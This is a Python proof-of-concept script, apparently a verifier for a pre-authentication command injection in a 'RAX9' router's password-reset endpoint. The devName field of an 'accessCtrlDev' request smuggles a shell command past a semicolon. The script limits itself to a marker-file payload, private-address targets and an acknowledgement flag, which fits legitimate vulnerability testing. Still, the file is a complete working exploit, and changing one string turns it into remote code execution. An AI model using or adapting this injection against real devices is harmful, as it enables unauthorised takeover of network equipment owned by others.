#!/usr/bin/env python3
"""Bounded RAX9 password-reset dispatcher command-injection verifier.

The payload is intentionally fixed: it can only create a marker under /tmp.
Targets must resolve exclusively to loopback, RFC1918, or link-local addresses.
"""

import argparse
import ipaddress
import json
import socket
import urllib.parse
import urllib.request


def safe_target(host: str) -> None:
    addresses = {item[4][0] for item in socket.getaddrinfo(host, None)}
    if not addresses:
        raise SystemExit("target did not resolve")
    for raw in addresses:
        ip = ipaddress.ip_address(raw)
        if not (ip.is_loopback or ip.is_private or ip.is_link_local):
            raise SystemExit(f"refusing non-private target address: {ip}")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5001)
    parser.add_argument(
        "--path", default="/pwd_reset/reset_pwd.plua"
    )
    parser.add_argument(
        "--acknowledge-owned-device",
        action="store_true",
        help="required safety acknowledgement",
    )
    args = parser.parse_args()

    if not args.acknowledge_owned_device:
        raise SystemExit("pass --acknowledge-owned-device to run the verifier")
    safe_target(args.host)

    marker = "FRIDAY;touch /tmp/rax9-preauth-rce-marker;#"
    request_json = {
        "function": "accessCtrlDev",
        "data": [
            {
                "action": "add",
                "iid": "1",
                "rule": "allow",
                "devName": marker,
                "macAddr": "02:00:00:00:00:01",
            }
        ],
    }
    body = urllib.parse.urlencode(
        {"inputJson": json.dumps(request_json, separators=(",", ":"))}
    ).encode()
    url = f"http://{args.host}:{args.port}{args.path}"
    request = urllib.request.Request(url, data=body, method="POST")
    with urllib.request.urlopen(request, timeout=10) as response:
        print(f"HTTP {response.status}")
        print(response.read().decode("utf-8", "replace"))


if __name__ == "__main__":
    main()
